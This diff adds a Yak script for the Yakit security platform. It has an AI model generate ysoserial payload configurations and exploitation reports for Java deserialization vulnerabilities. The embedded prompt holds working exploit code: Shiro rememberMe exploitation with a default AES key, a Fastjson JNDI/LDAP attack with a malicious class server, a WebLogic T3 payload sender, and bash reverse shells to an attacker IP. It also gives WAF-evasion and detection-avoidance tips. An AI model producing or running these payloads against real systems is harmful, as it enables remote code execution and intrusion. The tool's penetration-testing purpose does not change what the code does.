@@ -1,0 +1,656 @@
+__DESC__ = "该forge根据用户提供的Java反序列化漏洞利用场景信息（目标环境、框架版本、可用依赖等），利用AI模型分析并生成最佳的YSO payload参数配置和利用建议。报告内容包括Gadget选择分析、Class模板推荐、参数配置建议、利用方式指导和防护绕过技巧。生成的报告为Markdown格式，帮助安全测试人员快速构建有效的Java反序列化payload。"
+__VERBOSE_NAME__ = "YSO Payload 参数生成与利用建议"
+__KEYWORDS__ = "Java反序列化,YSO,Gadget选择,payload生成,安全测试,漏洞利用"
+
+// 用户输入参数
+targetInfo = cli.String("targetInfo", cli.setHelp("目标环境信息（如：目标框架、版本、可用依赖库等）"))
+vulnerabilityType = cli.String("vulnerabilityType", cli.setHelp("漏洞类型（如：Shiro、Fastjson、WebLogic等）"), cli.setDefault("通用"))
+attackGoal = cli.String("attackGoal", cli.setHelp("攻击目标（如：命令执行、反弹shell、文件读取等）"), cli.setDefault("命令执行"))
+outputDir = cli.String("outputdir", cli.setVerboseName("报告输出目录"))
+cli.check()
+
+prompt = <<<prompt
+你是一名资深Java安全专家，精通Java反序列化漏洞利用和YSO（ysoserial）工具的使用。请根据用户提供的目标环境信息，生成详细的YSO payload配置方案和利用建议。
+
+# 可用的YSO配置信息
+
+## 所有可用的Gadget链
+以下是所有可用的Gadget链及其说明：
+
+### TemplatesImpl型Gadget（template: true，需要配合Class模板使用）：
+- Vaadin1: 用于Vaadin反序列化
+- Spring2: 用于Spring反序列化
+- Spring1: 用于Spring反序列化
+- ROME: 用于ROME反序列化
+- MozillaRhino2: 用于Mozilla Rhino反序列化
+- MozillaRhino1: 用于Mozilla Rhino反序列化
+- JSON1: 用于JSON反序列化
+- Jdk8u20: 用于JDK8u20反序列化
+- Jdk7u21: 用于JDK7u21反序列化
+- JavassistWeld1: 用于Javassist反序列化
+- JBossInterceptors1: 用于JBoss Interceptors反序列化
+- Hibernate1: 用于Hibernate反序列化
+- Click1: 用于Click反序列化
+- CommonsBeanutils1: Apache Commons Beanutils反序列化
+- CommonsBeanutils1_183: Apache Commons Beanutils 1.8.3版本
+- CommonsBeanutils2: Apache Commons Beanutils反序列化（变种）
+- CommonsBeanutils2_183: Apache Commons Beanutils 1.8.3版本（变种）
+- CommonsCollections2: Apache Commons Collections反序列化
+- CommonsCollections3: Apache Commons Collections反序列化
+- CommonsCollections4: Apache Commons Collections反序列化
+- CommonsCollections8: Apache Commons Collections反序列化
+- CommonsCollections10: Apache Commons Collections反序列化
+- CommonsCollections11: Apache Commons Collections反序列化
+- CommonsCollectionsK1: Apache Commons Collections反序列化（Kick版本）
+- CommonsCollectionsK2: Apache Commons Collections反序列化（Kick版本）
+
+### Transform型Gadget（使用反射链函数）：
+- CommonsBeanutils3: 使用jndi反射链
+- CommonsCollections1: Apache Commons Collections反序列化，支持多种反射链
+- CommonsCollections5: Apache Commons Collections反序列化，支持多种反射链
+- CommonsCollections6: Apache Commons Collections反序列化，支持多种反射链
+- CommonsCollections6Lite: Apache Commons Collections反序列化（轻量版），支持多种反射链
+- CommonsCollections7: Apache Commons Collections反序列化，支持多种反射链
+- CommonsCollections9: Apache Commons Collections反序列化，支持多种反射链
+- CommonsCollectionsK3: Apache Commons Collections反序列化（Kick版本），支持多种反射链
+- CommonsCollectionsK4: Apache Commons Collections反序列化（Kick版本），支持多种反射链
+- BeanShell1: BeanShell反序列化，支持多种反射链
+- Groovy1: Groovy反序列化，支持多种反射链
+
+### 特殊检测型Gadget：
+- FindClassByBomb: 通过延时检测class是否存在（使用class反射链）
+- FindClassByDNS: 通过DNS检测class是否存在（使用class-dnslog反射链）
+- FindAllClassesByDNS: 通过DNS检测所有class是否存在（使用dnslog反射链）
+- URLDNS: 通过URLDNS检测（使用dnslog反射链）
+
+## 所有可用的反射链函数（ReflectChainFunction）
+Transform型Gadget需要指定反射链函数，可用的有：
+- class-dnslog: 用于DNS反连检测类是否存在
+  参数: domain（域名）, class（类名）
+- class: 用于延时检测类是否存在
+  参数: class（类名）
+- dnslog: 用于DNS反连检测
+  参数: domain（域名）
+- httplog: HTTP协议反连
+  参数: url（反连URL）
+- raw_cmd: 通用命令执行
+  参数: cmd（命令）
+- win_cmd: Windows命令执行
+  参数: cmd（命令）
+- linux_cmd: Linux命令执行
+  参数: cmd（命令，默认whoami）
+- bcel: BCEL类加载
+  参数: bcel（BCEL代码）
+- bcel_with_args: BCEL类加载（带参数）
+  参数: bcel（BCEL代码）, args（参数）
+- base64: 指定JS脚本
+  参数: script（JS脚本）
+- loadjar: 加载JAR文件
+  参数: url（JAR路径）, name（类名）
+- loadjar_with_args: 加载JAR文件（带参数）
+  参数: url（JAR路径）, name（类名）, args（参数）
+- jndi: JNDI注入
+  参数: jndi（JNDI地址）
+
+## 所有可用的Class模板
+TemplatesImpl型Gadget需要配合以下Class模板使用：
+
+- MultiEcho: 支持Tomcat环境和Weblogic回显
+  参数: header-au-key（认证键，默认Accept-Language）, header-au-val（认证值，默认zh-CN,zh;q=1.9）, header（回显Header，默认Etag）, action（动作：echo/exec，默认echo）, position（位置：header/body，默认header）, cmd（命令）
+
+- TomcatEcho: Tomcat回显
+  参数: header-au-key（认证键，默认Accept-Language）, header-au-val（认证值，默认zh-CN,zh;q=1.9）, header（回显Header，默认Etag）, action（动作：echo/exec，默认echo）, position（位置：header/body，默认header）, cmd（命令）
+
+- SpringEcho: Spring回显
+  参数: header（回显Header，默认Etag）, action（动作：echo/exec，默认echo）, position（位置：header/body，默认header）, cmd（命令）
+
+- TemplateImplClassLoader: 用于TemplatesImpl的类加载器，可以加载任意类
+  参数: base64Class（base64编码的字节码）
+
+- DNSLog: 通过DNSLog反连检测代码执行
+  参数: domain（域名）
+
+- ModifyTomcatMaxHeaderSize: 修改Tomcat请求Header的最大长度限制
+  参数: max（最大长度，默认40960）
+
+- RuntimeExec: Runtime命令执行
+  参数: cmd（命令，默认whoami）
+
+- ProcessBuilderExec: ProcessBuilder命令执行
+  参数: cmd（命令，默认whoami）
+
+- ProcessImplExec: ProcessImpl命令执行
+  参数: cmd（命令，默认whoami）
+
+- TcpReverse: TCP反连
+  参数: host（反连主机）, port（反连端口，int类型）, token（Token）
+
+- TcpReverseShell: TCP反弹Shell
+  参数: host（反连主机）, port（反连端口，int类型）
+
+- Sleep: 休眠
+  参数: time（休眠时间）
+
+- EmptyClassInTemplate: 用于TemplatesImpl的空类（无参数）
+
+## 通用扩展选项
+所有Gadget和Class都支持以下扩展选项：
+- className: 自定义类名（建议随机生成，避免特征检测）
+- isObfuscation: 是否启用混淆（true/false，混淆后可防止反编译并加密字符串常量）
+- version: Java版本号（如52代表Java 8，51代表Java 7）
+- dirtyData: 脏数据大小（填写数字，用于绕过WAF检测）
+- twoByteChar: 双字节字符编码（true/false，序列化时使用双字节字符编码String对象，绕过明文检测）
+
+# 目标环境分析
+根据提供的信息，分析：
+- 目标框架及版本（如Apache Shiro 1.2.4、Fastjson 1.2.24等）
+- 可用的依赖库和Gadget链（从上述列表中选择）
+- Java版本及其对payload的影响
+- 目标环境的防护机制（如WAF、序列化白名单等）
+
+# Gadget链选择建议
+基于目标环境，从上述可用Gadget列表中推荐最适合的Gadget链：
+- Gadget类型：从上述列表中选择合适的Gadget（如CommonsCollections6、Spring2等）
+- 适用场景：该Gadget链的最佳使用场景
+- 依赖要求：需要目标环境存在哪些依赖库及版本
+- 成功率评估：在目标环境中的预期成功率
+- 如果是Transform型Gadget，还需要选择合适的反射链函数
+
+# Class模板推荐
+如果使用TemplatesImpl型Gadget，从上述Class模板列表中推荐：
+- 模板类型：从上述列表中选择合适的Class模板（如RuntimeExec、MultiEcho、TcpReverseShell等）
+- 执行方式：说明该模板的代码执行方式
+- 参数配置：根据模板的参数列表配置关键参数（如命令、回连地址等）
+- 兼容性说明：该模板在不同Java版本下的兼容性
+
+# YSO参数配置方案
+提供具体的YSO参数配置：
+
+## Gadget配置
+```
+Gadget: [推荐的Gadget名称]
+说明: [选择原因]
+```
+
+## Class配置
+```
+Class: [推荐的Class模板]
+说明: [选择原因]
+```
+
+## 关键参数
+列出需要配置的关键参数及推荐值：
+- className: [类名建议，如随机生成或特定命名]
+- isObfuscation: [是否启用混淆，true/false及原因]
+- version: [Java版本号，如52对应Java 8]
+- dirtyData: [脏数据大小，用于绕过检测]
+- twoByteChar: [是否使用双字节字符编码，用于绕过WAF]
+- 其他业务参数: [如命令、URL、端口等]
+
+## 配置示例
+根据选择的Gadget类型提供配置示例：
+
+### 示例1：TemplatesImpl型Gadget配置
+```json
+{
+  "gadget": "CommonsCollections3",
+  "class": "RuntimeExec",
+  "options": [
+    {
+      "key": "className",
+      "value": "EvilClass_[随机字符]"
+    },
+    {
+      "key": "isObfuscation",
+      "value": "true"
+    },
+    {
+      "key": "version",
+      "value": "52"
+    },
+    {
+      "key": "twoByteChar",
+      "value": "true"
+    },
+    {
+      "key": "dirtyData",
+      "value": "1024"
+    },
+    {
+      "key": "cmd",
+      "value": "whoami"
+    }
+  ]
+}
+```
+
+### 示例2：Transform型Gadget配置
+```json
+{
+  "gadget": "CommonsCollections6",
+  "class": "linux_cmd",
+  "options": [
+    {
+      "key": "twoByteChar",
+      "value": "true"
+    },
+    {
+      "key": "dirtyData",
+      "value": "2048"
+    },
+    {
+      "key": "cmd",
+      "value": "bash -c 'bash -i >& /dev/tcp/[IP]/[PORT] 0>&1'"
+    }
+  ]
+}
+```
+
+# 利用方式指导
+
+## Payload生成代码
+根据选择的Gadget类型提供对应的Yak脚本代码示例：
+
+### 示例1：TemplatesImpl型Gadget代码（如CommonsCollections3）
+```yak
+log.setLevel("info")
+
+// 生成Gadget对象
+gadgetObj, err = yso.GetGadget(
+    "CommonsCollections3",
+    yso.useTemplate("RuntimeExec"),
+    yso.evilClassName("EvilClass_" + str.RandStr(8)),
+    yso.obfuscationClassConstantPool(),
+    yso.majorVersion(52),
+    yso.useClassParam("cmd", "whoami")
+)
+if err {
+    log.error("生成Gadget失败: %v", err)
+    return
+}
+
+// 序列化为字节码
+gadgetBytes, err = yso.ToBytes(gadgetObj, yso.twoBytesCharString(), yso.dirtyDataLength(1024))
+if err {
+    log.error("序列化失败: %v", err)
+    return
+}
+
+// 16进制展示payload
+hexPayload = codec.EncodeToHex(gadgetBytes)
+log.info("Payload生成成功")
+println(hexPayload)
+
+// Base64编码
+base64Payload = codec.EncodeBase64(gadgetBytes)
+println("Base64: " + base64Payload)
+```
+
+### 示例2：Transform型Gadget代码（如CommonsCollections6）
+```yak
+log.setLevel("info")
+
+// 生成Gadget对象
+gadgetObj, err = yso.GetGadget(
+    "CommonsCollections6",
+    "linux_cmd",
+    {
+        "cmd": "whoami",
+    }
+)
+if err {
+    log.error("生成Gadget失败: %v", err)
+    return
+}
+
+// 序列化为字节码
+gadgetBytes, err = yso.ToBytes(gadgetObj, yso.twoBytesCharString(), yso.dirtyDataLength(2048))
+if err {
+    log.error("序列化失败: %v", err)
+    return
+}
+
+// 16进制展示payload
+hexPayload = codec.EncodeToHex(gadgetBytes)
+log.info("Payload生成成功")
+println(hexPayload)
+```
+
+### 示例3：生成独立的Class文件（不使用Gadget）
+```yak
+log.setLevel("info")
+
+// 生成Class对象
+classObj, err = yso.GenerateClass(
+    yso.useTemplate("TcpReverseShell"),
+    yso.evilClassName("ReverseShell_" + str.RandStr(8)),
+    yso.obfuscationClassConstantPool(),
+    yso.majorVersion(52),
+    yso.useClassParam("host", "192.168.1.100"),
+    yso.useClassParam("port", "4444")
+)
+if err {
+    log.error("生成Class失败: %v", err)
+    return
+}
+
+// 序列化为字节码
+classBytes, err = yso.ToBytes(classObj)
+if err {
+    log.error("序列化失败: %v", err)
+    return
+}
+
+// 16进制展示payload
+hexPayload = codec.EncodeToHex(classBytes)
+log.info("Class生成成功")
+println(hexPayload)
+```
+
+## 漏洞利用流程
+根据漏洞类型，提供详细的利用步骤：
+1. Payload序列化过程
+2. 传输方式（HTTP Cookie、POST Body、JNDI等）
+3. 加密/编码处理（如Shiro需要AES-CBC加密）
+4. 发送时机和方式
+5. 验证方法（如何确认利用成功）
+
+## 具体利用代码
+根据目标漏洞类型提供完整利用代码：
+
+### Shiro反序列化利用
+```yak
+// 参数配置
+target = "127.0.0.1:8080"
+base64Key = "kPH+bIxk5D2deZiIxcaaaA=="  // base64编码的AES key
+key, _ = codec.DecodeBase64(base64Key)
+
+// 生成Gadget payload
+gadgetObj, err = yso.GetGadget(
+    "CommonsCollections2",
+    yso.useTemplate("RuntimeExec"),
+    yso.evilClassName("Evil_" + str.RandStr(8)),
+    yso.useClassParam("cmd", "whoami")
+)
+gadgetBytes, _ = yso.ToBytes(gadgetObj)
+
+// 加密payload（Shiro使用AES-CBC加密）
+payload = codec.PKCS5Padding(gadgetBytes, 16)
+encodePayload = codec.AESCBCEncrypt(key, payload, nil)[0]
+finalPayload = codec.EncodeBase64(append(key, encodePayload...))
+
+// 发送payload
+rsp, req, _ = poc.HTTP(`GET /login HTTP/1.1
+Host: {{params(target)}}
+Cookie: rememberMe={{params(payload)}}
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+
+`, poc.params({"payload": finalPayload, "target": target}))
+
+log.info("响应包: %s", string(rsp))
+```
+
+### Fastjson反序列化利用
+```yak
+// 参数配置
+localIp = "192.168.1.100"
+port = 8086
+target = "http://192.168.1.200:8080"
+className = "Evil_" + str.RandStr(8)
+
+// 生成恶意Class
+classObj, _ = yso.GenerateClass(
+    yso.useTemplate("RuntimeExec"),
+    yso.evilClassName(className),
+    yso.useClassParam("cmd", "bash -c 'bash -i >& /dev/tcp/" + localIp + "/4444 0>&1'")
+)
+classBytes, _ = yso.ToBytes(classObj)
+
+// 启动反连服务器
+httpReverseAddress = sprintf("http://%s:%d", localIp, port)
+ldapReverseAddress = sprintf("ldap://%s:%d/%s", localIp, port, className)
+
+s = facades.NewFacadeServer(
+    "0.0.0.0", 
+    port, 
+    facades.httpResource(className + ".class", classBytes),
+    facades.ldapResourceAddr(className, httpReverseAddress),
+    facades.rmiResourceAddr(className, httpReverseAddress),
+)
+s.OnHandle(fn(msg) {
+    log.info("收到请求: %v", msg)
+})
+go s.Serve()
+
+// 发送Fastjson payload
+rsp, req, err = poc.HTTP(`POST / HTTP/1.1
+Host: {{params(target)}}
+Content-Type: application/json
+
+{
+    "a": {
+        "@type": "java.lang.Class",
+        "val": "com.sun.rowset.JdbcRowSetImpl"
+    },
+    "b": {
+        "@type": "com.sun.rowset.JdbcRowSetImpl",
+        "dataSourceName": "{{params(reverseAddr)}}",
+        "autoCommit": true
+    }
+}
+`, poc.params({"target": target, "reverseAddr": ldapReverseAddress}))
+
+log.info("发送Payload成功，响应: %s", string(rsp))
+```
+
+### WebLogic T3协议利用
+```yak
+// 生成Gadget payload
+gadgetObj, err = yso.GetGadget(
+    "CommonsCollections1",
+    "linux_cmd",
+    {
+        "cmd": "touch /tmp/hacked",
+    }
+)
+gadgetBytes, _ = yso.ToBytes(gadgetObj, yso.twoBytesCharString())
+
+// 通过T3协议发送
+target = "192.168.1.100:7001"
+err = t3.SendPayload(target, gadgetBytes)
+if err != nil {
+    log.error("发送失败: %v", err)
+} else {
+    log.info("Payload发送成功")
+}
+```
+
+# 防护绕过技巧
+
+## 混淆技术
+- 字符串常量加密：使用isObfuscation参数
+- 类名随机化：避免被特征检测
+- 双字节编码：绕过基于字符串匹配的WAF
+
+## WAF绕过
+- 使用脏数据：增加payload大小，干扰检测
+- 调整序列化格式：使用双字节字符编码
+- 分片传输：如果支持，考虑分片发送payload
+
+## 序列化白名单绕过
+- 选择白名单内的Gadget链
+- 利用泛型擦除等Java特性
+- 使用间接调用链
+
+# 风险评估与注意事项
+
+## 检测风险
+- 当前配置被检测的可能性评估
+- 哪些特征可能触发告警
+- 如何降低被检测的风险
+
+## 稳定性分析
+- Payload的稳定性和成功率
+- 可能导致目标服务崩溃的风险
+- 建议的测试方法
+
+## 合规提醒
+- 仅在授权的安全测试中使用
+- 建议的测试环境和条件
+- 数据备份和恢复方案
+
+# 替代方案
+如果主推荐方案不可行，提供2-3个备选方案，包括：
+- 备选Gadget链
+- 备选Class模板
+- 不同的利用方式
+
+# 输出要求
+你需要输出两部分内容：
+1. **report-content**: 完整的Markdown格式分析报告，包含上述所有章节的详细内容
+2. **yso-config**: YSO配置对象，包含以下字段：
+   - gadget: 推荐的Gadget链名称（字符串）
+   - class: 推荐的Class模板名称或反射链函数名（字符串）
+   - params: 参数配置数组，每个元素是一个对象，包含key和value字段，格式为 [{"key": "参数名", "value": "参数值"}, ...]
+     至少包含以下推荐参数：
+     * className: 自定义类名（建议随机生成）
+     * isObfuscation: 是否启用混淆（true/false）
+     * version: Java版本号（如52）
+     * dirtyData: 脏数据大小（数字）
+     * twoByteChar: 是否使用双字节字符编码（true/false）
+     * 以及其他业务相关参数（如cmd、host、port、domain等，根据选择的Gadget和Class而定）
+     
+   示例格式：
+   ```json
+   {
+     "gadget": "CommonsCollections6",
+     "class": "RuntimeExec",
+     "params": [
+       {"key": "className", "value": "EvilClass_abc123"},
+       {"key": "isObfuscation", "value": "true"},
+       {"key": "version", "value": "52"},
+       {"key": "cmd", "value": "whoami"}
+     ]
+   }
+   ```
+
+请确保报告内容具备高度可操作性，包含完整的参数配置、代码示例和详细的利用步骤，采用Markdown格式编写，便于安全测试人员直接参考使用。
+prompt
+
+schema = jsonschema.ActionObject(
+    jsonschema.paramString("report-content", jsonschema.description("分析生成的Markdown格式报告")),
+    jsonschema.paramObject("yso-config",
+        jsonschema.description("YSO payload配置对象"),
+        jsonschema.paramString("gadget", jsonschema.description("推荐的Gadget链名称，如CommonsCollections6、Spring2等"), jsonschema.required()),
+        jsonschema.paramString("class", jsonschema.description("推荐的Class模板名称，如RuntimeExec、MultiEcho等，如果是Transform型Gadget则填写反射链函数名"), jsonschema.required()),
+        jsonschema.paramObjectArray("params", 
+            jsonschema.description("参数配置数组，每个元素包含key和value字段。常见参数包括：className、isObfuscation、version、dirtyData、twoByteChar以及各种业务参数如cmd、host、port等"),
+            jsonschema.paramString("key", jsonschema.description("参数名"), jsonschema.required()),
+            jsonschema.paramString("value", jsonschema.description("参数值"), jsonschema.required())
+        )
+    )
+)
+
+forgeHandle = func(params) {
+    yakit.StatusCard("执行状态", "开始分析")
+    
+    // 构建完整的输入信息
+    inputInfo = sprintf(`
+目标环境信息：
+%s
+
+漏洞类型：%s
+攻击目标：%s
+`, targetInfo, vulnerabilityType, attackGoal)
+    
+    yakit.Info("正在分析目标环境并生成YSO payload配置方案...")
+    yakit.StatusCard("执行进度", "正在调用AI模型分析")
+    
+    // 调用AI生成报告
+    res = liteforge.Execute(
+        sprintf("%s\n\n输入信息:\n%s", prompt, inputInfo), 
+        liteforge.output(schema)
+    )~
+    dump(res)
+    yakit.StatusCard("执行进度", "AI分析完成，正在生成报告")
+    
+    // 获取报告内容
+    reportString = res.GetString("report-content")
+    println(reportString)
+    
+    // 获取YSO配置
+    ysoConfig = res.GetInvokeParams("yso-config")
+    if ysoConfig != nil {
+        gadget = ysoConfig.GetString("gadget")
+        class = ysoConfig.GetString("class")
+        paramsArray = ysoConfig.GetInvokeParamsArray("params")
+        
+        yakit.Info("推荐的Gadget链: %s", gadget)
+        yakit.Info("推荐的Class模板: %s", class)
+        
+        // 将配置信息也展示出来
+        configInfo = sprintf("\n\n---\n\n## AI推荐的YSO配置\n\n- **Gadget链**: %s\n- **Class模板**: %s\n\n### 参数配置\n\n", gadget, class)
+        
+        if paramsArray != nil && len(paramsArray) > 0 {
+            configInfo += "```json\n[\n"
+            for i, param := range paramsArray {
+                key = param.GetString("key")
+                value = param.GetString("value")
+                yakit.Info("参数 %s = %s", key, value)
+                configInfo += sprintf("  {\n    \"key\": \"%s\",\n    \"value\": \"%s\"\n  }", key, value)
+                if i < len(paramsArray) - 1 {
+                    configInfo += ","
+                }
+                configInfo += "\n"
+            }
+            configInfo += "]\n```\n"
+        } else {
+            configInfo += "无额外参数\n"
+        }
+        
+        reportString = reportString + configInfo
+    }
+    
+    // 显示报告
+    yakit.Markdown(reportString)
+    
+    // 保存Markdown报告
+    name := sprintf("yso_payload_advisor_%s.md", str.RandStr(8))
+    path = file.Join(yakit.GetHomeTempDir(), name)
+    res,err = str.Unquote(reportString)
+    if err == nil{
+        reportString = res
+    }
+    err = file.Save(path, reportString)
+    if err != nil {
+        yakit.Error("保存文件失败: %v", err)
+        return err
+    }
+    yakit.StatusCard("Markdown报告路径", path)
+    yakit.Info("Markdown报告已保存: %s", path)
+    
+    // 转换为Word文档
+    yakit.StatusCard("执行进度", "开始转换为Word文档")
+    outputPath, err := pandoc.SimpleConvertMarkdownFileToDocxContext(context.Background(), path)
+    if err != nil {
+        yakit.Error("转换Word文档失败: %v", err)
+        return err
+    }
+    
+    // 如果指定了输出目录，移动文件
+    if outputDir != "" {
+        tmpDir, fileName = file.Split(outputPath)
+        newPath = file.Join(outputDir, fileName)
+        err = file.Mv(outputPath, newPath)
+        if err == nil {
+            outputPath = newPath
+        }
+    }
+    
+    yakit.StatusCard("执行进度", sprintf("报告生成成功"))
+    yakit.StatusCard("Word报告路径", outputPath)
+    yakit.Info("Word报告已保存: %s", outputPath)
+    
+    return outputPath
+}
+
